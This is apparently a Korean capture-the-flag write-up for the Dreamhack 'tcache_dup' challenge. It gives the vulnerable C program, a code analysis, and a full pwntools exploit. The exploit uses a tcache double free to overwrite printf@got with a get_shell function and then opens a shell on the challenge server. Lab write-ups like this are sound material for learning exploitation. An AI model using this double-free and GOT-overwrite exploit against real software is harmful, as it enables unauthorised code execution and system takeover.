```c
// Name: tcache_dup.c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```

```bash
$ checksec ./tcache_dup
[*] './tcache_dup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 코드 분석

* `tcache_dup.c:20-37` : `malloc` 함수로 청크를 할당한 후 메모리 영역을 초기화하지 않으므로 use after free가 발생할 가능성이 있다.
* `tcache_dup.c:39-50` : `free` 함수로 청크를 해제한 후 포인터를 초기화하지 않아 danglin pointer가 발생한다. 따라서 이를 이용하면 double free bug를 발생시킬 수 있다.
* `tcache_dup.c:52-54` : 호출하기만 하면 shell을 탈취할 수 있다.

# 공격

## Design Exploitation

코드를 살펴보면, 계속 반복적으로 호출하는 함수가 `printf`이므로 `printf`의 got에 `get_shell` 함수의 주소를 넣어주면 즉시 shell을 탈취할 수 있으리라는 것을 생각해볼 수 있다.

또한, 문제에서 제공된 라이브러리에서는 key값을 체크하지 않아 double free가 막히지 않는다.
따라서 double free bug를 활용하여 `printf@got`에 `get_shell`의 주소를 덮어쓰면 익스플로잇에 성공할 수 있다.

## Exploit

다음과 같은 익스플로잇 코드를 구성하면 flag를 얻을 수 있다.

```python
# Name: tcache_dup.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 19928

p = remote(HOST,PORT) # remote
# p = process('./tcache_dup', env={'LD_PRELOAD':'./libc-2.27.so'}) # local
e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

#ifndef __Custom_Functions_For_Convenience_
#define __Custom_Functions_For_Convenience_ 
def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
#endif /* __Custom_Functions_For_Convenience_ */
    
#ifndef __Custom_Global_Variables_For_Convenience_
#define __Custom_Global_Variables_For_Convenience_
dummy = b'dobby is free'
printf_got = e.got['printf']
get_shell = e.sym['get_shell']
#endif /* __Custom_Global_Variables_For_Convenience_ */

# Initial tcache is empty
# tcache[0x40] : empty
create(0x30, dummy)

# tcache[0x40] : Chunk A
delete(0) # tcache[0x40].append(Chunk A)

# tcache[0x40] : Chunk A -> Chunk A
delete(0) # tcache[0x40].append(Chunk A)

# tcache[0x40] : Chunk A -> printf@got -> ...
create(0x30, p64(printf_got)) # tcache[0x40].pop(); tcache[0x40].first().set_fd(printf_got)

# tcache[0x40] : printf@got -> ...
create(0x30, dummy) # tcache[0x40].pop()

# Overwrite printf@got
create(0x30, p64(get_shell)) # tcache[0x40].first().set_data(get_shell); tcache[0x40].pop()

p.interactive()
```